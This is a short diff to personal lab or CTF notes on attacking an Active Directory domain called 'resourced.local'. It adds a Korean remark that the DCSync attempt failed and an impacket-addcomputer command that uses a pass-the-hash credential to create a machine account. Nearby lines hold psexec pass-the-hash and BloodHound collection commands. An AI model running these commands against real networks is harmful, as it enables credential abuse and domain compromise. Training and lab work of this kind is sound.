@@ -1056,8 +1056,10 @@ impacket-psexec L.Livingstone@192.168.124.175 -hashes :19a3a7550ce8c505c2d46b5e3
 # SharpHOund
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Desktop -OutputPrefix test
 
-# DCSync
+# DCSync 아래 실패
 lsadump::dcsync /domain:resourced.local /user:test
+
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.124.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
 
 ```
 
